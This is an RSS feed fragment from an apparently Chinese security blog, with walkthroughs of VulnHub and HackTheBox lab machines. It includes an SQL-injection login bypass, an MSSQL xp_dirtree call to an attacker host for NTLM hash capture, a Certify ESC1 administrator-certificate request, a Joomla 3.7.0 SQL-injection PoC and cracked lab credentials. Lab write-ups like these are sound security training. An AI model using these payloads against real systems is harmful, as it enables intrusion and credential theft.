&lt;p&gt;机器没有开明显的远程登录端口，如果要登录，那么只能获取管理权限，目前只能围绕着域渗透的思路来进行，先上bloodhound：&lt;/p&gt;
&lt;p&gt;看来主要是集中在这条路线上了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6ddc00a4b74a93c6fca3a86638a36a94image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x022 billu b0x</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x022-billu-b0x/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x022-billu-b0x/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb16b1c1751f84b969df6604d5a1e8ca6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7d996f5b20ee5336741028b9be2db0de%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;getshell&#34;&gt;getshell&lt;/h1&gt;
&lt;h3 id=&#34;方法一代码审计&#34;&gt;方法一、代码审计&lt;/h3&gt;
&lt;p&gt;首先有个坑，burp改POST不行，必须得浏览器才能触发文件下载：&lt;/p&gt;
&lt;p&gt;这里可以知道web目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8d6398eb6954ccd1aa2b35d7c90d534c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;下载登录主页的源码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEeb258297dd772074ae4fc728a74f1ee2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;审计：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE43509cd1947b9c62a3136bda0f4ef53f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我打眼一看是过滤了单引号’     然后我就尝试了对单引号进行绕过，16进制、base64、两次URL编码都以失败告终，然后这里的判断逻辑是，sql语句查询出来有内容即可。&lt;/p&gt;
&lt;p&gt;最后无奈看了WP&lt;/p&gt;
&lt;p&gt;payload是：&lt;/p&gt;
&lt;p&gt;password: \&lt;/p&gt;
&lt;p&gt;username: or 1=1 #&lt;/p&gt;
&lt;p&gt;带入到代码里面其实是这样的：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$run=&amp;#39;select * from auth where  pass=\&amp;#39;&amp;#39;.$pass.&amp;#39;\&amp;#39; and uname=\&amp;#39;&amp;#39;.$uname.&amp;#39;\&amp;#39;&amp;#39;;
带入后：
select * from auth where pass=&amp;#39;\&amp;#39; and uname=&amp;#39;or 1=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里要注意，将sql语句和php分开来理解，要不然会比较麻烦，但是不好理解的是，讲道理这里直接让password=or 1=1 #\就可以实现了啊。后面借着phpmyadmin试了一下，可以清楚的看到闭合结果：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2fa0bf7c770bd4ce88620d4fdc95bdf9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这样就非常好理解了因为这样的闭合方式，&amp;rsquo;&amp;rsquo; and uname=&amp;lsquo;成为了password的查询方式，后面没有查询username，而是直接or 1=1，也就是说必须由password传递转义符\，必须由username传递注释符号#&lt;/p&gt;
&lt;p&gt;然后回到登录后的页面，看起来是有文件上传的，但是直接上传被拦截了，好吧，再次代码审计：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE57bb2b1f89278bbb717fd406939b09b7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;判断文件的代码，白名单，基本无法绕过：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd5df3ea123376f27b54fac74fc9073d1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后又去看了一下PW，好好好，确实没发现这个地方可能有文件包含，因为数据包中并没有文件后缀，看起来像是传递参数，但是看了一下代码，是文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE38ebf5aaa3610f2477df9b8015f9e4c7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;图片马getsgell：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE743c6855b2e9b184524bf4c0cb63c81f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;方法二&#34;&gt;方法二&lt;/h3&gt;
&lt;p&gt;开局扫描的时候，没有扫出来phpmy，两个方法解决，1是使用dirb的big.txt，二是使用dirsearch的默认参数即可&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1331932f49ccb2d829bb9a148bc7b08b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后在文件包含时，会发现两个php文件，将他们也下载下来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5d7e136115a110a2a9783c87d79faac0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X022 cascade</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x022-cascade/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x022-cascade/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;端口扫描就出现问题了，不让扫描？&lt;/p&gt;
&lt;p&gt;最开始7000速率不行，改成2000就可以了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5b4510dec7bf52d0a6fdb5778f11656eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7c3558936730c318e4f16a7a4710881aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe59f9ec75d3b2e07289bfda3ede34301image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;关键端口开放情况，445、389、3268、5985&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEef367b5e20ce2fe2e6c5c7af8f0a1a33image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE534850d681dd10754905937f9f8f01a7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf72e7106a3b68884c2de05b953cd7289image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获取了用户名，可以尝试密码喷洒，或者AS-REP Roasting：&lt;/p&gt;
&lt;p&gt;失败了，但是这里面密码喷洒一般很少：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE81b62e47f4b347b26233abc593d71817image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看用户所有信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE80e99820f3a63b441c8f8ae31c5f680aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码：&lt;/p&gt;
&lt;p&gt;r.thompson&lt;/p&gt;
&lt;p&gt;rY4n5eva&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5ebcb345680f2cf3e99d1a5346ef60e2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winrm登录失败，回头看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE341c8acb1447d66cb8f6db4647876625image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;翻查了一圈，把所有东西都下载下来了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE487616986a1b1f7e82dbaa82257d6cc2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;新用户？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE664b982284b36d00711ac12bf5d60859image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;别的不说，在目前的情况下，我认为这些文件里面，应该是存在登录成功的方式的：&lt;/p&gt;
&lt;p&gt;破解vnc的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE08d05305af661ad047e2733e0594d088image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名为：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE73254ba3dd435455c5bcae596a3cb7b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登陆成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9fa334cf4469d5319461bc6c3a2e0144image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;bloodhound：&lt;/p&gt;
&lt;p&gt;好像没路子：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc9fb672ffed27c19776681e4b0ed4a49image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看winpe:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9126de058238ce21cb0fec0d0eb12e3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0df3b5f3f25492129fe291418d862bf1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像没有头绪，应该是得继续信息收集：&lt;/p&gt;
&lt;p&gt;再去使用s.smith登录smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb1693bd21024dc11b08f1032713bfaedimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现db文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6ee9797f68c4c925e44ed3e9677d69c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现是sqllite文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4c8ea33241bc97ef76aab785e2d4df3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x023 DC-2</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x023-dc-2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x023-dc-2/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;记得改hosts&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdc4dca9dd3e02ca737028f5f316a8cc0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbcf6be2c15b5a0c2388aba99105bafa5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;wpscan &amp;ndash;url &lt;a href=&#34;http://dc-2/&#34;&gt;http://dc-2/&lt;/a&gt; &amp;ndash;enumerate u&lt;/p&gt;
&lt;p&gt;发现三个用户&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbf9adfd72a35dd1d5017f877ee1574fe%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破，常规的爆破字典爆不出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE354a18966df1d6436c6ab07759176347%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;翻查了一下网站，作者有提示：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE30cdbe1b13257d92c15a6d1a1a71f622%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;cewl收集密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE438749c3129825f749137f0ecb4e95b9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE512258a79a9923b8d2bcfac2ab23d94e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;jerry / adipiscing&lt;/p&gt;
&lt;p&gt;tom / parturient&lt;/p&gt;
&lt;p&gt;登录web成功，但是由于权限不够无法getshell，也是卡了好久，才想起来可以去看看ssh端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8a67b3431c82f122fde4d4a279a19201%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;这里就有点恶心了，大部分命令不给用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1559754611604fc518be1cae7644f6e7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提示说让我们切换到jerry用户，然后命令还是不给用，然后我尝试了vi提权的操作，发现是操作对了的，但是我没发现是命令没找到，我淦：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfffcf8d24c99e066c71290f921d68df9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe2ad70198e6b645d1cdca3824fd7419e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里就是命令无法找到了，而不是受限的环境了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5ea29d01f2528f7683b22f0afe9446a2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看环境变量：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1c8967adfa44167bc760e3cb69a8eccb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;改变环境变量，理论上这步可以直接输入绝对路径来执行命令，如果你记得所有的命令路径的话：&lt;/p&gt;
&lt;p&gt;export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbcfa77986cbf2831137dfa2cd2d9beb4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;切换到jerry，sudo提权，有gtfobins没啥好说的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE084998ea9d8216610103c86be6093be6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X023 Escape</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x023-escape/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x023-escape/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE240fca89a47034f53abe9633404aa2bdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE879f954d7fb881ade1d7bc17e7aac2e4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf7aa426ecdb6ae1e15d35397b13941d4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的端口：389，445，1433，5985&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE86f4b2d645b49a6f29f43ef449edc719image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb发现这个东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE622d9e2dcc45ef56d812810e9a62425eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现sqlserver登录方式：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf6f86c814237304e9ae50205f8812cadimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;连接成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfcf3e587b7fdca0e5f97b907476c477fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看了一圈儿，确实没东西了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93c53ee64eda152b3a85dd37a474591cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后无奈看了wp，属实没想到，sqlserver也能玩儿relay：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb4410d8a0f9b2db975f55218ef5b7042image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;EXEC MASTER.sys.xp_dirtree &amp;lsquo;\10.10.16.12\test&amp;rsquo;, 1, 1&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE11226968d518189f35c30b446f9d04c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很快就破解了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2a5fbd741986f884e6e00480ac611c41image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可以直接登录winrm:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2527100e2c4da7b9bddff00d8ba82ec6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe72515d5df9229358952cef420e422dcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bloodhound:&lt;/p&gt;
&lt;p&gt;无法分析出可用的路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEed4a4ebd002b6571a549c3bb96629870image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winpeass也没能发现什么有用的东西，看了一下wp，呐应该是思路的缺失了，查看sqlserver的日志文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3444a296c8840c0c82d03c468cf4a537image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;咋说呢，错误日志一般是不会记录错误密码的，但是会记录错误用户：&lt;/p&gt;
&lt;p&gt;感觉还是有点缺乏想象力，这里应该是模仿用户输入错误了密码为用户名，导致日志被记录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEec28db1f6252dfbd0177e8309ebf054fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;是远程组的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7a2ddc8d65b75c8cd4d35e0720513e6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE48bee9d46c173643897e2ae0c40d3868image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很好，bloodhound有局限，ADCS的相关内容其实也有了解，但是没想到这一点：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc57b1c3d18a5c33ea7055cb65593cbcbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ESC1：&lt;/p&gt;
&lt;p&gt;.\Certify.exe request /ca:sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb1b4d27cb784d2bbdaac9777449b7e84image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;复制出来，提取：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2ce912c75e9c2ad1492c36814f69d5f8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x024 DC 3.2</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x024-dc-3.2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x024-dc-3.2/</guid>
      <description>&lt;p&gt;开机遇到报错，修改以下配置：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4cd164de68cafa73ead52528439ebda6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc724cd1c56a1136f76aef7ed843bc672%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE936ff0c59005305217e93f18889523ef%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe03763fdd8beb0e52b175e5097d00217%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用joomale cms，通过joomla扫描发现版本和组件，可能存在已知漏洞：&lt;/p&gt;
&lt;p&gt;joomscan.pl扫描结果，版本号为3.7.0&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEadd720ccfc02d6865b640a40a1c3d915%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;JoomlaScan扫描结果，以下为相关组件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1a265df724d312d3851b0e701efab813%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;POC如下：&lt;/p&gt;
&lt;p&gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)&lt;/p&gt;
